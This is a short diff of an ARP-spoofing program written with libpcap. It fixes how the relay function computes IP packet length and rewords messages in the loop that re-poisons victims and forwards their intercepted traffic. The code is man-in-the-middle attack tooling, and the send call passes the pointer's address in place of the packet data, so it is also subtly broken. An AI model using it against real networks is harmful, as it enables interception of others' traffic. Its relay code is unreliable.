@@ -177,8 +177,7 @@ void relay(pcap_t* handle, const u_char* packet, Pair& pair){
     eth_hdr->dmac_ = pair.tmac;
 
     PIpHdr ip_hdr = (PIpHdr)(packet + sizeof(EthHdr));
-    uint16_t ip_size = ((ip_hdr->tlen) & 0xFF00) >> 8;
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthHdr)+ip_size);
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthHdr)+ntohs(ip_hdr->tlen));
     if (res != 0){
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         exit(-1);
@@ -200,10 +199,10 @@ void arp_spoof(pcap_t* handle, Pair& pair){
         }
         if (is_recover(packet, pair)){
             infect(handle, pair);
-            printf("RECOVER DETECTED :: reinfect success\n");
+            printf("[DETECTED] recover :: reinfect\n");
         } else if (is_spoofed(packet, pair)) {
             relay(handle, packet, pair);
-            printf("SPOOFED DETECTED :: relay success\n");
+            printf("[DETECTED] spoofed IP :: relay\n");
         }
     }
 }
